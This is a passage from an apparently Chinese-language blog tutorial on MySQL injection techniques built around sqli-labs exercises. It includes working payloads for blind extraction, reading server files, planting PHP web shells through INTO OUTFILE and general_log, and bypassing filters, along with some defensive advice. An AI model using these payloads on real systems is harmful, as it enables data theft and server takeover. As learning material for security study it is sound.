src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190530114227.png" alt="20190530114227.png"></td><td></td><td></td></tr></tbody></table><blockquote><p>MySQL 5.0以上版本存在一个存储着数据库信息的信息数据库–INFORMATION_SCHEMA ，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。 而5.0以下没有。<strong>因此利用环境在5.0以上</strong></p></blockquote><h3 id="布尔之构造形成报错的bool表达式-爆破"><a href="#布尔之构造形成报错的bool表达式-爆破" class="headerlink" title="布尔之构造形成报错的bool表达式+爆破"></a>布尔之构造形成报错的bool表达式+爆破</h3><p>由于报错信息可能会被ban，就可以接合二者<br>and if(xxx,1，nnnn),其中xxx就是上面构造的爆库语句，nnnn就是上面的报错语句，如果爆库语句是错的，则会报错，不然就返回1</p><blockquote><p>?id=1’ and IF(ord(mid((select password from users limit %d,1),%d,1))=%d,1,exp(710)) %%23</p></blockquote><h3 id="布尔之构造形成时延的bool表达式-爆破"><a href="#布尔之构造形成时延的bool表达式-爆破" class="headerlink" title="布尔之构造形成时延的bool表达式+爆破"></a>布尔之构造形成时延的bool表达式+爆破</h3><p>我的一篇文章<a href="https://corp0ra1.github.io/2019/05/22/%E6%B3%A8%E5%85%A5%E5%86%8D%E6%8E%A2/#%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F">传送门</a></p><blockquote><p>?id=1’ and IF(ord(mid((select password from users limit %d,1),%d,1))=%d,sleep(5),1) %%23</p><blockquote><p>sleep(5)在前面的话 因为经常报错，放在if判断的后面部分的话节省时间<br>Python脚本对应的基于时间判断正误：if time.time() - starttime &gt; 2: 则xxxxx。而startime在执行get请求赋值为starttime=time.time即可,记得import time</p></blockquote></blockquote><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>可参考我的两篇文章：</p><ul><li>  <a href="https://corp0ra1.github.io/2019/05/22/%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A5/#%E5%8A%A0%E9%A4%90">sql之基于报错的注入</a></li><li><a href="https://corp0ra1.github.io/2019/05/22/%E6%B3%A8%E5%85%A5%E5%86%8D%E6%8E%A2/">sql注入再探</a></li></ul><h1 id="高级方法"><a href="#高级方法" class="headerlink" title="高级方法"></a>高级方法</h1><h2 id="导入导出文件"><a href="#导入导出文件" class="headerlink" title="导入导出文件"></a>导入导出文件</h2><h3 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h3><p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。<br><strong>使用条件</strong>:</p><ul><li><p> 必须有权限读取并且文件必须完全可读</p><blockquote><p>and (select count(<em>) from mysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。<br>and (select count(<em>) from mysql.user)&gt;0/</em> 返回错误,应该是管理员给数据库帐户降权</p></blockquote></li><li><p>   欲读取文件必须在服务器上</p></li><li><p>   必须指定文件完整的路径</p></li><li><p>   文件内容必须小于max_allowed_packet</p></li></ul><p>如果该文件不存在,或因为上面的任一原因而不能被读出,函数返回空。比较难满足的就是权限,在 windows 下,如果 NTFS 设置得当,是不能读取相关的文件的,当遇到只有administrators 才能访问的文件,users 就别想 load_file 出来。<br><strong>在实际的注入中,我们有两个难点需要解决:</strong></p><ul><li>   绝对物理路径</li><li>   构造有效的畸形语句 (报错爆出绝对路径)</li></ul><p>在很多 PHP 程序中,当提交一个错误的 Query,如果 display_errors = on,程序就会暴露WEB 目录的绝对路径,只要知道路径,那么对于一个可以注入的 PHP 程序来说,整个服务器的安全将受到严重的威胁。<br><strong>编码思路</strong>：</p><ol><li><p>路径使用\ ，否则会被当作转义符号</p><blockquote><p>-1 union select 1,1,1,load_file(c:\boot.ini)<br>Explain:路径里的/用 \代替</p></blockquote></li><li><p>   盘符根路径下可用c:admin.txt</p></li><li><p>16进制文件名处理</p><blockquote><p>-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)<br>Explain:“c:/boot.ini”的 16 进制是“0x633a2f626f6f742e696e69”</p></blockquote></li><li><p>char(路径ascii)</p><blockquote><p>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))<br>Explain:“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的 ASCII 代码</p></blockquote></li></ol><h3 id="load-data-intofile导入文件到数据库"><a href="#load-data-intofile导入文件到数据库" class="headerlink" title="load data intofile导入文件到数据库"></a>load data intofile导入文件到数据库</h3><p>LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行,并装入一个表中。文件名称必须为一个文字字符串。<br>在注入过程中,我们往往需要一些特殊的文件,比如配置文件,密码文件等。当你具有数据库的权限时,可以将系统文件利用 load data infile 导入到数据库中。<br>先将服务器端文件导入进数据库，然后从数据库中把数据select出来到攻击者的电脑中。就好像数据库是数据在服务器与攻击者之间的中介机构</p><blockquote><p>示例:load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’<br>lines terminated by ‘\n’</p></blockquote><h3 id="select……into-outfile-‘file-name’-导入到文件"><a href="#select……into-outfile-‘file-name’-导入到文件" class="headerlink" title="select……into outfile ‘file_name’ 导入到文件"></a>select……into outfile ‘file_name’ 导入到文件</h3><p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上,因此您必须拥有 FILE写入权限,才能使用此语法。file_name 不能是一个已经存在的文件。<br>我们一般有两种利用形式:</p><ul><li><pre><code>第一种直接将 select 内容导入到文件中:  `Select version() into outfile “c:\\phpnow\\htdocs\\test.php”`  此处将 version()替换成一句话,&lt;?php @eval($_post[“mima”])?&gt;也即  Select &lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php”  直接连接一句话就可以了,其实在 select 内容中不仅仅是可以上传一句话的,也可以上传很  多的内容。</code></pre></li><li><pre><code>第二种修改文件结尾:  Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16 进制文  件  解释:通常是用‘\r\n’结尾,此处我们修改为自己想要的任何文件。同时可以用 FIELDS  TERMINATED BY  16 进制可以为一句话或者其他任何的代码,可自行构造。在 sqlmap 中 os-shell 采取的就是  这样的方式,具体可参考 os-shell 分析文章: http://www.cnblogs.com/lcamry/p/5505110.html</code></pre></li></ul><p><strong>TIPS</strong>:<br>(1)可能在文件路径当中要注意转义,这个要看具体的环境<br>(2)上述我们提到了 load_file(),但是当前台无法导出数据的时候,我们可以利用下面的语<br>句:<br><code>select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile ‘c:\\wamp\\www\\test.php’</code><br>可以利用该语句将服务器当中的内容导入到 web 服务器下的目录,这样就可以得到数据了。<br>上述 my.ini 当中存在 password 项(不过默认被注释),当然会有很多的内容可以被导出来,这个要平时积累</p><h3 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a>secure_file_priv</h3><p>高版本的MYSQL添加了一个新的特性secure_file_priv，用来限制数据导入和导出操作，例如由LOAD DATA 和SELECT…INTO OUTFILE语句和LOAD_FILE()函数执行的行为。<br>如何查看mysql是否开启了文件导入导出,即对应的secure_file_priv的值？</p><blockquote><p><code>mysql&gt;show global variables like &#39;%secure%&#39;;</code><br>如果secure_file_priv的值为null，则没开启；如果为空，则开启；如果为目录，则说明只能在该目录下操作。<br>在MySQL 5.5.53版本之前，这个变量默认为空，因此我们就可以使用这些函数。但是在该版本之后，mysql该值默认为NULL值，因此会禁用这些函数。</p></blockquote><p>Secure_file_priv是一个全局变量且是一个只读变量，也就是说在运行时无法更改。<br>那么如何修改secure_file_priv？（为了搭建环境）</p><ul><li>   windows下：修改my.ini 在[mysqld]内加入secure_file_priv =xxx</li><li>   linux下：修改/etc/my.cnf 在[mysqld]内加入secure_file_priv =xxx<br>然后重启mysql，再查询secure_file_priv</li></ul><p>mysql高版本的配置文件中默认没有secure_file_priv这个选项，但是你用SQL语句来查看secure_file_priv发现，没配置这个选项就是NULL，也就是说无法导出文件。</p><h3 id="常用路径"><a href="#常用路径" class="headerlink" title="常用路径"></a>常用路径</h3><p>《天书》里面收集的常用导入导出文件路径：<a href="https://www.cnblogs.com/lcamry/p/5729087.html">传送门</a></p><h3 id="通过log日志文件写入shell-好用极了！"><a href="#通过log日志文件写入shell-好用极了！" class="headerlink" title="通过log日志文件写入shell(好用极了！)"></a>通过log日志文件写入shell(好用极了！)</h3><p>通过Mysql root账号general_log_file方法获取webshell，<a href="https://www.freebuf.com/column/143125.html">传送门</a></p><blockquote><p>set global general_log=on;set global general_log_file=’/var/www/tony.php’;select ‘<?php eval($_POST[tony]) ?>‘;</p></blockquote><p>mysql打开general log之后，所有的查询语句都可以在general log文件中以可读的方式得到，但是这样general log文件会非常大，所以默认都是关闭的。有的时候为了查错等原因，还是需要暂时打开general log的。换句话说general_log_file会记录所有的查询语句，以原始的状态来显示，如果将general_log开关打开，general_log_file设置为一个php文件，则查询的操作将会全部写入到general_log_file指定的文件，通过访问general_log_file指定的文件来获取webshell</p><ul><li>   mysql是最好用root账号运行的，因为他要往对应的文件夹里写入文件，没有权限就很蛋疼</li><li>   最好写入html运行网页目录下，这样直接可以执行，不需要调用文件包含漏洞</li><li>   存在一定问题：即你把人家log打开，如果不关闭，在网站sql请求量巨大的时候，可能导致文件的大小过大而出现意想不到的问题，因此记得及时关闭</li><li>  在我的Ubuntu下，只能写入到var/tmp目录下，即使我给/var/www 777的权限也无法写入,因为我<a href="http://www.111cn.net/database/mysql/46839.htm">Ubuntu的mysqld在强制模式</a>中,所以拒绝写入，改下配置文件即可复现</li></ul><h2 id="增删改而非查"><a href="#增删改而非查" class="headerlink" title="增删改而非查"></a>增删改而非查</h2><p>掌握它的结构 从而才能构造出合理的语句！<a href="https://dev.mysql.com/doc/refman/8.0/en/sql-syntax-data-definition.html">mysql官方语法传送门</a><br>select更常见是因为大部分用户大部分操作都是去查询数据。而对于用户增删改数据的地方，很少见而且可控参数很少。但是只要有，则可以尝试！<br>利用方法和select类似，只需要有个成功与否反馈即可构造和select查询一样的效果。不过更多都是基于报错，基于updatexml这个XPATH的漏洞进行注入</p><h3 id="增-insert"><a href="#增-insert" class="headerlink" title="增_insert"></a>增_insert</h3><h3 id="删-delete"><a href="#删-delete" class="headerlink" title="删_delete"></a>删_delete</h3><p>删数据:<br>delete from 表名;<br>delete from 表名 where id=1;<br>删除结构:<br>删数据库:drop database 数据库名;<br>删除表:drop table 表名;<br>删除表中的列:alter table 表名 drop column 列名;</p><h3 id="改-updata"><a href="#改-updata" class="headerlink" title="改_updata"></a>改_updata</h3><p>修改所有:updata 表名 set 列名=’新的值,非数字加单引号’ ;<br>带条件的修改:updata 表名 set 列名=’新的值,非数字加单引号’ where id=6;</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><ul><li>  <a href="https://haiderm.com/second-order-sql-injection-explained-with-example/">文字版</a>：就是对输入的数据进行处理后存储，但是没有对取出来的数据进行处理，即导致的原因是信任存储进去的脏数据</li><li>  <a href="https://haiderm.com/second-order-sql-injection-explained-with-example/">youtube视频</a></li><li>  国内的文章搜索：二次注入即可</li><li><strong>个人见解</strong>：比如less24，可对比查看我的分析过程 即可明白<blockquote><p>注册账户admin’#，经过mysql_escape_string处理之后为admin\ ‘\ #，存进去用户名为admin’#，此时不存在注入。但是在其他地方，比如更新密码，<code>UPDATE users SET PASSWORD=&#39;6&#39; where username=&#39;admin&#39;#&#39; and password=&#39;&#39;</code>，就导致了修改admin的密码了，也就是二次注入</p></blockquote></li></ul><p>二次排序注入思路:</p><ol><li>黑客通过构造数据的形式,在浏览器或者其他软件中提交 HTTP 数据报文请求到服务<br>端进行处理,提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。</li><li>服务端应用程序会将黑客提交的数据信息进行存储,通常是保存在数据库中,保存的<br>数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响<br>应。</li><li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li><li>服务端接收到黑客提交的第二个请求信息后,为了处理该请求,服务端会查询数据库<br>中已经存储的数据信息并处理,从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服<br>务端环境中执行。</li><li>服务端返回执行的处理结果数据信息,黑客可以通过返回的结果数据信息判断二次注<br>入漏洞利用是否成功。</li></ol><h2 id="基础过滤"><a href="#基础过滤" class="headerlink" title="基础过滤"></a>基础过滤</h2><h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><p>正则模式修正符 <a href="https://blog.csdn.net/forest_fire/article/details/50944901">传送门</a><br>i：不区分大小写<br>m：将模式视为多行，^ 和 <code>$</code>都可以匹配每一行的开头和结尾（默认 即使是多行的数据 ^ <code>$</code>只能匹配整个多行数据的开头和结尾）<br>s：使得.能够匹配换行符（默认的.不能表示换行符号，即.匹配到换行符自动中断匹配）</p><blockquote><p>如果正则表达式只匹配一次，则可以通过双写绕过</p></blockquote><h3 id="and-or"><a href="#and-or" class="headerlink" title="and  or"></a>and  or</h3><p>||  &amp;&amp;<br>或者考虑异或注入，1^1=0 1^0=1来判断</p><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>字符|含义<br>| – | – |<br>%09|TAB 键(水平)<br>%0a|新建一行<br>%0c|新的一页<br>%0d|return 功能<br>%0b|TAB 键(垂直)<br>%a0|空格</p><p>上述都可以过<code>&#39;/[ +]/&#39;</code>的匹配，但是只有%a0可过/s的正则匹配（Ubuntu环境下可行，win没尝试）</p><p>当然还有/**/ 以及括号包含的格式来过空格，括号当然最好，因为/*老被过滤</p><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><p>– #被过滤了，/*又不能单独使用，此时目前我想到的就只能是基于闭合了，就是构造最后一个参数去闭合</p><h2 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h2><p><strong>这个与服务器的架构有关系</strong><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190607113234.png" alt="20190607113234.png"><br>服务器端有两个部分:第一部分为 tomcat 为引擎的 jsp 型服务器,第二部分为 apache为引擎的 php 服务器,真正提供 web 服务的是 php 服务器。工作流程为: client 访问服务器,能直接访问到 tomcat 服务器,然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p><p><strong>以下为大多数服务器对于参数解析的介绍</strong><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190607113332.png" alt="20190607113332.png"><br>比如百度就是第一个参数，Yahoo获取第二个，GOOGle获取第三个，<a href="https://www.cnblogs.com/backlion/p/8556150.html">传送门</a><br><strong>HPP原理</strong><br>此处我们想一个问题:index.jsp?id=1&amp;id=2 请求,针对第一张图中的服务器配置情况,客户端请求首先过 tomcat,tomcat 解析第一个参数,接下来 tomcat 去请求 apache(php)服务器,apache 解析最后一个参数。那最终返回客户端的应该是哪个参数?<br>Answer:此处应该是 id=2 的内容,应为时间上提供服务的是 apache(php)服务器,返回的数据也应该是 apache 处理的数据。而在我们实际应用中,也是有两层服务器的情况,那为什么要这么做?是因为我们往往在 tomcat 服务器处做数据过滤和处理,功能类似为一个 WAF。而正因为解析参数的不同,我们此处可以利用该原理绕过 WAF 的检测。该用法就是 HPP(HTTP Parameter Pollution),http 参数污染攻击的一个应用。HPP 可对服务器和客户端都能够造成一定的威胁。<br><strong>防护之道</strong><br>1.HPP是一种新的注入型漏洞。要防止这种漏洞，除了要做好对输入参数的格式验证外，另外还需要意识到HTTP协议是允许同名的参数的，在整个应用的处理过程中要意识到这一点从而根据业务的特征对这样的情况作正确的处理。<br>2.让WAF或其他网关设备（比如IPS）在检查URL时，对同一个参数被多次赋值的情况进行特殊处理。由于HTTP协议允许相同参数在URL中多次出现，因此这种特殊处理需要注意避免误杀的情况<br>3.在代码层面，编写WEB程序时，要通过合理的$_GET方法获取URL中的参数值，而尝试获取web服务器返回给程序的其他值时要慎重处理。</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p><strong>原理</strong><br>宽字节注入原理即是利用编码转换，将服务器端强制添加的本来用于转义的\符号吃掉，从而能使攻击者输入的引号起到闭合作用，以至于可以进行SQL注入。<br><strong>限制</strong><br>宽字节对转义字符的影响发生在character_set_client=gbk的情况，也就是说，如果客户端发送的数据字符集是gbk，则可能会吃掉转义字符\，从而导致转义消毒失败<br><strong>需要了解的编码传递过程</strong><br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/GetImage.jpeg"><br>具体参考该网页<a href="https://www.lulublog.cn/post/73">传送门</a><br><strong>思路</strong><br>想办法将 ‘ 前面添加的 \ 除掉,一般有两种思路:</p><ol><li> %df 吃掉 \具体的原因是 urlencode(‘\ ) = %5c%27,我们在%5c%27 前面添加%df,形成%df%5c%27,而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字,此时%df%5c 就是一个汉字, %27 则作为一个单独的符号在外面,同时也就达到了我们的目的。</li><li> 将 \’ 中的 \ 过滤掉,例如可以构造 %**%5c%5c%27 的情况,后面的%5c 会被前面的%5c给注释掉。</li></ol><p><strong>个人总结</strong></p><details>计算机的本质还是010101的编码,取决于你是怎么看待这串代码！-   为什么加了/之后可以绕过？ 在数据从客户端client传输到服务器段的connetion的时候，会对比这两个字符集，然后对010101的字符串在进行修改（参考Unicode转UTF-8在前面的10xxxx） 而'的逃逸就发生在这个过程，由于connection翻译之后，会把翻译出来的东西进行拆解或者说是预处理（比如‘1\’string转int 以及实体化'的过程 ）在这个过程中 又会对一部分上传来的编码进行省略处理，以及重新编码%bf%5c进行GBK组合成汉字，造成‘逃逸 connetion再到数据库内部查询还得还得看内部字符集，又是一层编码!，不过这个不影响 -   “character_set_client=BINARY”为什么可以防绕？ “character_set_client=BINARY”，即使“不做转换、直接存储”，那么mysql在解析sql之前，sql中a的内容还是%df%5c' -   为什么My_real_ecape_string可以？ My_real_ecape_string在执行前会考虑到连接的当前字符集。<ul><li>  为什么会出现乱码？<br>内部字符集出来，转换成result字符集又是一层编码，也就是这个过程造成的 </li></ul><p>所以再说一次！本质是010101，关键是你怎么看待</p></details><p>上面的是我很久之前的总结，现在感觉有点啰嗦。让我重新再啰嗦一次吧<br>核心在于编码的问题<br>而且在于Apache端和mysql数据端的编码方式不同，从而导致的问题<br>Apache端 %df %27，因为这个不能组合构成一个字，所以单独把他们看做 x’，进而转义之后给’之前加了个%5c，形成%df%5c%27，当传递到MySQL数据库端的时候，从前大到后扫描，因为默认GBK，把%df%5c可以看做一个整体X，进而形成X’，从而导致%27即‘的逃逸（因为%df无法用字符表示，这里用x代替，%df%5c===&gt;X）</p><p><strong>为什么是0xBF，其他编码可以吗</strong><br>想要0xXY能够吞掉转义“’”的转义符“\”需要满足以下几个条件： </p><ul><li>  0xXY不是有效字符编码 </li><li>  0xXY27不是有效字符编码 </li><li>  0xXY5C是有效字符编码 </li></ul><p>满足这一条件的只有0xBF吗？当然不，GBK编码中的单字节字符完全兼容ASCII编码，双字节字符的总体编码范围为0x8140 ~ 0xFEFE，首字节在0x81 ~ 0xFE之间，尾字节在0x40~0xFE之间，剔除0xXX7F一条线。 </p><blockquote><p>同一个编码文件里，怎么区分ASCII和中文编码呢？从ASCII表我们知道标准ASCII只有128个字符:0~ 127即0x00~ 0x7F（0111 1111）。所以区分的方法就是，高字节的最高位为0则为ASCII，为1则为中文。(所以ascii和中文编码，是以0x8开始，但是为啥不是0x80，而是0x81开始？这就..太远了，反正龟腚！) </p></blockquote><p>我们注意到，尾字节范围在0x40<del>0xFE之间，0x27不在此范围内，0x5C恰巧在此范围内。所以0xbf可以和0x5c组合却不能和0x27组合<br>同时能够吞掉转义“’”的转义符“\”的0xXY有很多很多，远不止0xBF一个。<br>只要0xXY在0x81</del>0xFE之间就都可以达到此效果。经过自己fuzzer之后确实如此！！！<br>为何网上广为流传的会是0xBF呢？类似0xAA这样的组合多好记啊。这些人有病病呢！难道是发明这个漏洞的人叫BoyFriend？（手动狗头）<br><strong>只有GBK编码有此问题吗</strong><br>只有GBK编码中存在神奇的0xXY可以吞掉“\”，在其他编码中是否也存在这样的0xXY呢？<br>gb2312和GBK同源同根，GBK是gb2312的扩充，对GBK有效的0xXY对gb2312也有效。<br>除了gb2312和GBK外，我们最常见的字符编码便是UTF-8了。UTF-8中存在特殊的0xXY吗？很遗憾，并不存在。<br>下面这段UTF-8的编码规则摘自参考文献[3]： </p><blockquote><p>UTF-8是一种变长字节编码方式。对于某一个字符的UTF-8编码，如果只有一个字节则其最高二进制位为0；如果是多字节，其第一个字节从最高位开始，连续的二进制位值为1的个数决定了其编码的位数，其余各字节均以10开头。UTF-8最多可用到6个字节。<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190607171626.png" alt="20190607171626.png"></p></blockquote><p>由上表可知：UTF-8第一字节的取值范围是：00-7F、C2-F4<br>然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中的：<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190607171712.png" alt="20190607171712.png"><br>可见，UTF-8中多字节字符的每个节的最高位一定是1，而0x5C的最高位为0，<br>所以并不存在0xXY，使得0xXY5C是效字符编码，也不存在0xXYZW，使得0xXYZW5C是效字符编码。<br>所以，UTF-8编码无此5C绕过的问题。<br><strong>为什么这么多人用？utf-8天下大统？</strong><br>网页编写UTF-8和GBK哪个编码好，根据个人需要，如果你主要做中文程序的开发，客户也主要是中国人的话就用GBK吧，因为UTF-8编码的中文使用了三个字节，用GBK节省了空间。如果做英文网站开发，还是用utf-8吧，因为utf-8中英文只占一个字节。GBK中英文也是两个字节的，并且国外客户访问GBK要下载语言包。如果你的网站是中文的，但国外用户也不少，最好也用UTF-8的吧。<br>尽管现在呼吁所有的程序都使用unicode编码，所有的网站都使用utf-8编码，来一个统一的国际规范。但仍然有很多，包括国内及国外（特别是非英语国家）的一些cms，仍然使用着自己国家的一套编码，比如gbk，作为自己默认的编码类型。也有一些cms为了考虑老用户，所以出了gbk和utf-8两个版本。<br><strong>SET NAMES gbk和Mysql_set_charset的区别</strong><br><a href="https://blog.csdn.net/caoxiaohong1005/article/details/70255352">传送门</a><br>我推荐直接调到结尾，看函数执行过程，以及对应的输出结果就行<br>只可意会不可言传：只有mysql_real_escape_string()前需要指定mysql连接字符集即使用mysql_set_charset()，这样使用GBK才是安全的<br><strong>怎么防范</strong></p><ul><li>  正确使用mysql_real_escape_string()前需要指定mysql连接字符集即使用mysql_set_charset()函数，如果不指定字符集且使用的字符编码是类似GBK的宽字符，可能导致宽字符注入。</li><li>  MySQL采用GBK编码在设置连接字符集的时候要当心，设置错误就可能会导致乱码或者宽字节注入漏洞，使用UTF8编码应该可以规避宽字节注入问题。另外提一点，GB2312也没有这个问题，GB2312的编码范围和GBK其实是不同的 </li></ul><p><strong>补充</strong><br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html#0x05">P牛的一篇文章</a></p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><blockquote><p>Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的,我们知道在 mysql 中,主要是命令行中,每一条语句结<br>尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。</p></blockquote><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 SQL 中,分号(;)是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql<br>语句后继续构造下一条语句,会不会一起执行?因此这个想法也就造就了堆叠注入。而 union<br>injection(联合注入)也是将两条语句合并在一起,两者之间有什么区别么?区别就在于 union<br>或者 union all 执行的语句类型是有限的,可以用来执行查询语句,而堆叠注入可以执行的是<br>任意的语句。</p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，<strong>可能受到 API 或者数据库引擎<br>不支持的限制</strong>,当然了<strong>权限不足</strong>也可以解释为什么攻击者无法修改数据或者调用一些程序。<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190609114659.png" alt="20190609114659.png"></p><blockquote><p>Ps:此图是从原文中截取过来的,因为我个人的测试环境是 php+mysql,是可以执行的,此<br>处对于 mysql/php 存在质疑。但个人估计原文作者可能与我的版本的不同的原因。</p></blockquote><p>虽然我们前面提到了堆叠查询可以执行任意的 sql 语句,但是这种注入方式并不是十分<br>的完美的。<strong>在我们的 web 系统中,因为代码通常只返回一个查询结果</strong>,因此,堆叠注入第<br>二个语句产生错误或者结果只能被忽略,我们在前端界面是无法看到返回结果的。<br>因此,在读取数据时,我们建议使用 union(联合)注入。同时在使用堆叠注入之前,<br>我们也是需要知道一些数据库相关信息的,例如表名,列名等信息。</p><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>之所以能使用堆叠注入和后台的实现方法有关，比如说less38之前的几关就不能使用堆叠注入。而less38可以使用是因为PHP页面调用sql语句时用的是mysqli_multi_query()函数，所以此时可以使用堆叠注入</p><h3 id="防护之道"><a href="#防护之道" class="headerlink" title="防护之道"></a>防护之道</h3><p>根据p牛小密圈所说：<code>因为PDO的出现，多句执行已经是趋势了，目前只有两个选择mysqli和pdo，但是官方推荐的是PDO，而且大多框架用的是PDO，那么PDO一定能多句执行吗？2014年之前的确实如此，而在5.5，5.6之后可以在PDO：：MYSQL_ATTR_MULTI_STATEMENTS里面明确指定开关，但是默认还是开的，你只需要手工禁用即可</code></p><h3 id="补充-1"><a href="#补充-1" class="headerlink" title="补充"></a>补充</h3><p>针对19年的强网杯的随便注这道题，考验的就是堆叠注入绕过对select的过滤，有三种方法</p><ol><li>   show table,同时改表名列名绕过<a href="https://altman.vip/2019/05/27/QWB2019-writeup/#%E9%9A%8F%E4%BE%BF%E6%B3%A8"></a></li><li>   利用concat函数绕过<a href="https://xz.aliyun.com/t/5282?accounttraceid=bc0c17b4-6e92-4883-ab5b-d929454bbbc7#toc-2"></a>:<code>set @sql=concat(&#39;sel&#39;,&#39;ect * from &#39;1919810931114514&#39;&#39;);prepare presql from @sql;execute presql;</code></li><li>   利用hex编码绕过,将②的set端的语句 改成hex编码即可，这样就可以不用concat拼接了。参考P牛的文章<a href="https://t.zsxq.com/6Y7yVZ3">传送门</a><h3 id="补充！"><a href="#补充！" class="headerlink" title="补充！"></a>补充！</h3>当只显示第一条结果的时候<br>既然我们可以增删改，除了按照《mysql注入天书》里面的插入或者删除数据，我们更可以利用之前的select去写入 load文件<br>而且目前我在less38上面尝试通过log日志文件写入shell成功,而且这个方法不限于secure_file_priv的影响<br><code>http://sql.com/Less-38/?id=1&#39;;set global general_log=on;set global general_log_file=&#39;/tmp/tony.php&#39;;select &#39;&lt;?php eval($_POST[tony]) ?&gt;&#39;;%23</code></li></ol><h2 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>看下select的语法规则<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611220719.png" alt="20190611220719.png"><br>order  by后面可以跟上列名，表达式，或者位置+ASC/DESC指定升降序<br>既然可以跟上表达式，于是就可以构造！<br><strong>利用</strong><br>构造表达式，原理类似于bool盲注<br>如果构造的表达式是真的，order by 1，此时显示的一种结果<br>如果构造的表达式为假的，ordey by 0,此时显示的另外一种结果</p><h3 id="一次自以为然的尝试"><a href="#一次自以为然的尝试" class="headerlink" title="一次自以为然的尝试"></a>一次自以为然的尝试</h3><p><strong>我以为的方式</strong></p><ol><li>   直接bool：order by if(length(database())=8,1,0)</li><li>   报错bool:order by exp((length(database())=8)*710)</li><li>   延迟bool:order by if(length(database()=8),sleep(5),1)<br>呵，傻屌《天书》，要什么rand函数，直接撸1 0不就行了吗？</li></ol><p><strong>尝试之后发现</strong></p><ol><li>比如最开始的第一种，无论怎么更换length()=7，或者if(xx,1,2)等等<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611223348.png" alt="20190611223348.png"><br> 无论怎么换都是一样的结果？excuse me?</li><li>尝试直接测试select if(xx,1,2)的返回值<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611223223.png" alt="20190611223223.png"><br> 是非1即2啊</li><li>我再次尝试下直接order by 1  2<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611223442.png" alt="20190611223442.png"><br> 我直接order by 1 2显示的结果都不同</li><li> 为啥构造的就不行呢？<br>然后突然意识到了，貌似或者可能是因为返回值是个字符串的原因<br>再直接拿着字符串版本测试<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611230113.png" alt="20190611230113.png"><br>测试了下好像就是如此（“xxx”xxx为任意字符都是一样的结果）<br>还尝试了<code>BY 2+(&quot;2&quot;=1)</code>，<code>1+(&quot;2&quot;=1)</code>这种想利用加法来强制类型转换都返回的是没变化的结果（有的人的版本可行！我的不行）</li><li> 不仅如此，我还进行了字段名带不带双引号的测试<br><img src="https://raw.githubusercontent.com/corp0ra1/BlogPhoto/master/data/20190611230726.png" alt="20190611230726.png"><br>恩，就是因为返回值是个字符串，带引号导致的！</li><li> 搜了下文章，得到一个结论<a href="https://blog.csdn.net/u010757785/article/details/84619941">传送门</a>：<strong>排序正常只有int类型才起作用</strong><h3 id="反思"><a href="#反思" class="headerlink" 